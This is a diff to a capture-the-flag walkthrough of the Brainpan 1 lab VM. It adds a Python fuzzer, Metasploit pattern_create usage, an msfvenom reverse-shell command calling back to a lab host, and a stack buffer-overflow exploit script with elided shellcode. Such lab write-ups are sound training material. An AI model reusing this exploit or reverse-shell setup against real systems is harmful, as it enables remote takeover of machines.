@@ -71,25 +71,17 @@ IP ID Sequence Generation: All zeros
 
 `192.168.56.106:10000/bin/`
 
-Let's download the .exe file and have the look with `strings`
+Let's run the `strings` command to view the hardcoded strings within the binary
 
 ![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/strings.png)
 
-Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
-It turns out that the overflow occurs around(/with circa) 900 A's.
-
-![sending A's](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/sending-A's.png?raw=true)
-
-Stack addresses EAX EIP ESP
-
-`ruby /usr/share/metasploit-framwerok/tools/exploit/pattern_create.rb -l 900`
-
-Generated pattern:
-`# Brainpan 1 Walkthrough
-Following is the outcome of my hacking handiwork
-
+Time for launching Windows 32-bit VM and some scripting work
 
 ## 2. Fuzzing
+
+Time to make sure everything's ready and send brainpan.exe to the guest OS (setting up SimpleHTTPServer on the host may come in handy)
+
+In the next step we're gonna send a long, repeated string of A's with this simple fuzzer:
 
 ```
 import socket
@@ -102,8 +94,21 @@ for i in range(30):
   print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
   s.close()
 ```
-Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
-It turns out that the overflow occurs around(/with circa) 900 A's.
+Here, the Windows machine IP address given by DHCP is '192.168.56.105' (mind to change it). We use the script visible above and see what it spits out.
+Turns out that the overflow occurs around the length 900 A's.
+
+
+**In the first round** we are going to see whether it's vulnerable to buffer overflow. We can write a simple fuzzer in python 
+
+![sending A's](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/sending-A's.png?raw=true)
+
+Stack addresses EAX EIP ESP
+
+`ruby /usr/share/metasploit-framwerok/tools/exploit/pattern_create.rb -l 900`
+
+Generated pattern:
+
+
 
 ![sending A's](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/pattern_create.png?raw=true)
 
@@ -153,6 +158,32 @@ Setting JMP ESP address and shellcode
 `0x31170000` <- no ASLR
 
 `msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
+
+
+```
+import socket, sys
+
+buf = ("\xb8\xf9\...\...\...\..."
+"\xc9\xb1\...\..\...\...\...\..."
+"...
+"...
+...
+"\x92\x7c\xa6\xf6")
+
+payload = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+  s.connect(('192.168.56.106',9999))
+except:
+  print "Error"
+  sys.exit(0)
+
+s.recv(1024)
+s.send(payload)
+```
+
+
+
 
 ![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/generating-shellcode.png?raw=true)
 
